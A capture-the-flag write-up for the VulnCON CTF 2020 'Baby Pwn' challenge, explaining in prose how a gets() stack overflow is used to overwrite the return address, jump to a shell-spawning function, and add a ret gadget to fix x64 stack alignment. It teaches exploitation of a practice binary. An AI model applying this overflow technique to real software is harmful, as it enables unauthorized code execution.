<h1>VulnCON CTF 2020 - Baby Pwn</h1>

<h2>Binary Exploitation - 100 pts</h2>

<h3>Writeup by YR81</h3>

<h4>Discussion</h4>

<h5>Program Behavior</h5>

<p>This program features a very standard stack buffer overflow vulnerability that results from the use of <code>gets()</code>. Recall that <code>gets()</code> reads an unbounded number of characters from standard input, and when the destination is a buffer on the stack, we can hijack program execution by controlling the return address.</p>

<p class = "caption">Figure 1. Disassembly of <code>main()</code> function with the vulnerable call highlighted.</p>

<p>Even better, the program has a function named <code>overflowed()</code> that directly spawns a shell by calling <code>system("/bin/sh")</code> (usually we would have to construct this call ourselves through shellcode or ROP).</p>

<h5>ROP Exploit</h5>

<p>Our payload thus consists of filling up the buffer (in this case, since the buffer is at <code>rbp - 0x10</code>, then we need 16 bytes), overwriting the saved frame pointer (8 bytes in x64), and finally overwriting the return address. Now, we just return to <code>overflowed()</code> and enjoy our shell, right?</p>

<p>There turns out to be a small catch for these types of exploits in x64. If we overwrite the return pointer to point directly to <code>overflowed()</code>, we actually get a segmentation fault! The reason for this is that functions such as <code>printf()</code> and <code>system()</code> expect the stack to be aligned to a 16-byte (paragraph) granularity, since they use the XMM registers for efficient data processing. If we directly return to <code>overflowed()</code>, the stack will not satisfy this alignment, as we can verify with a debugger. To address this small (but important) issue, we can condition the stack by inserting a single <code>ret</code> gadget (i.e., a do-nothing gadget that just returns to the next address). Now, when we enter the call to <code>system()</code>, the stack will be aligned and we get our shell.</p>
